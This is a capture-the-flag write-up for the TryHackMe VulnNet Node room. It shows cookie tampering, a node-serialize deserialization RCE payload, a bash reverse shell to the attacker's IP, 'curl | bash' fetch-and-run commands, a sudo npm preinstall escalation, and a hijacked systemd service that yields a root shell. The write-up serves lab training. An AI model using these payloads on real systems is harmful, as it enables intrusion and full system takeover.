---
title: THM VulnNet2 Node
author: hanhctf
date: 2023-04-26 16:22:22 +0700
categories: [Write-up, THM]
tags: [unserialize()]
toc: true
mermaid: true
---

# [**_VulnNet2 Node room_**](https://tryhackme.com/room/vulnnetnode)

## Nmap

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-10 06:54 EST
Nmap scan report for 10.10.219.168
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 724.12 seconds
```

See only port `8080` is open

## Web analysis

1. Couldn't find anything except `/login` page.
2. have session cookie on GET REQUEST
    
```
GET /login HTTP/1.1
Host: 10.10.148.28:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.148.28:8080/
Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D      ⇒    {"username":"Guest","isGuest":true,"encoding": "utf-8"}
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sun, 24 Jan 2021 15:26:02 GMT
If-None-Match: W/"84f-177350083bb"
```    

3. Change cookie `{"username":"Guest","isGuest":true,"encoding": "utf-8"}` to `{"username":"Admin","isGuest":true,"encoding": "utf-8"}`
⇒ webpage change to ADMIN user    
 ![](/commons/THM/VulnNet2-Node/1_change_cookie.png)   


4. Change cookie `{"username":"Guest","isGuest":true,"encoding": "utf-8"}` to `{"username":"Admin","isAdmin":true,"encoding": "utf-8"}`
⇒ Nothing     


5. Change cookie `{"username":"Guest","isGuest":true,"encoding": "utf-8"}` to invalid cookie
⇒ Error code 500        
![](/commons/THM/VulnNet2-Node/2_invalid_cookie.png)   


6. Review error code return


```
SyntaxError: Unexpected token � in JSON at position 0
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)
```

Found this article https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/  about a RCE on node-serialize module.   



The exploit payload:   

```
{"rce":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('ls /',function(error, stdout, stderr) { console.log(stdout) });\n }()"}
```


## Foothold

1. Create a reverse shell rev.sh

```shell
#!/bin/bash
bash -i >& /dev/tcp/10.8.51.26/9001 0>&1
```

2. Run a http server on attacker machine(I run with python on port 80)

```python
python3 -m http.server 80
```

3. Listen on port 9001 on another terminal

```shell
nc  -nlvp 9001
```

4. Send a request with cookie edited on burpsuite(or browser)

Payload:

```
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('curl 10.8.51.36/rev.sh | bash ',function(error, stdout, stderr) {console.log(stdout)});\n}()","isGuest":true,"encoding": "utf-8"}
```

⇒ We got the shell.
![](/commons/THM/VulnNet2-Node/3_got_shell.png)   




```shell
www@vulnnet-node:~/VulnNet-Node$ whoami;id
whoami;id
www                                                                                                                  
uid=1001(www) gid=1001(www) groups=1001(www)
```

## From www → serv-manage

With the basic commands to find any privilege escalation on the Linux system sudo -l

```shell
www@vulnnet-node:~/VulnNet-Node$ sudo -l                                                                                                            
Matching Defaults entries for www on vulnnet-node:                                                                   
    env_reset, mail_badpass,                                                                                         
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin                         
                                                                                                                     
User www may run the following commands on vulnnet-node:                                                             
    (serv-manage) NOPASSWD: /usr/bin/npm 
```

⇒ We can run `/usr/bin/npm` with user **serv-manage**

Check npm on https://gtfobins.github.io/gtfobins/npm/#shell

```
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

Look like we don't have permision on `/tmp` when exploit
![](/commons/THM/VulnNet2-Node/4_error_exploit.png)   



Create a TF folder manually

```shell
www@vulnnet-node:/tmp$ mkdir ./exploit
www@vulnnet-node:/tmp$ TF=exploit
www@vulnnet-node:/tmp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
www@vulnnet-node:/tmp$ sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i

> @ preinstall /tmp/exploit
> /bin/sh

whoami;id                                                                              
serv-manage
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
```


***GOT USER FLAG.*** 


## Privilege Escalation

1. Continue use basic command `sudo -l`

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```



2. With `locate` we can find the path of the timer file:

```shell
serv-manage@vulnnet-node:~$ locate vulnnet-auto.timer
/etc/systemd/system/vulnnet-auto.timer
```


3. Review `/etc/systemd/system/vulnnet-auto.timer`

```shell
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer                                                                                                                                                                       
[Unit]                                                          
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target    
```


⇒ The timer is running VulnNet utilities every 30 min

Let check `vulnnet-job.service`

```shell
serv-manage@vulnnet-node:~$ locate vulnnet-job.service
/etc/systemd/system/vulnnet-job.service 

serv-manage@vulnnet-node:~$ ls -la /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service

serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```


⇒ service is writeable with **serv-manage** but we can't edit with nano or vim
⇒ So just replace contents of it with echo include payload encode by base64

```shell
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c 'curl 10.8.51.36/rev.sh | bash'

[Install]
WantedBy=multi-user.target
```

```shell
serv-manage@vulnnet-node:~$ echo W1VuaXRdCkRlc2NyaXB0aW9uPUxvZ3Mgc3lzdGVtIHN0YXRpc3RpY3MgdG8gdGhlIHN5c3RlbWQgam91cm5hbApXYW50cz12dWxubmV0LWF1dG8udGltZXIKCltTZXJ2aWNlXQojIEdhdGhlciBzeXN0ZW0gc3RhdGlzdGljcwpUeXBlPWZvcmtpbmcKRXhlY1N0YXJ0PS9iaW4vYmFzaCAtYyAnY3VybCAxMC44LjUxLjM2L3Jldi5zaCB8IGJhc2gnCgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ= | base64 -d > /etc/systemd/system/vulnnet-job.service

serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer 
serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer
```

⇒ We got a root shell  
![](/commons/THM/VulnNet2-Node/5_got_root_shell.png)

***GOT ROOT FLAG.***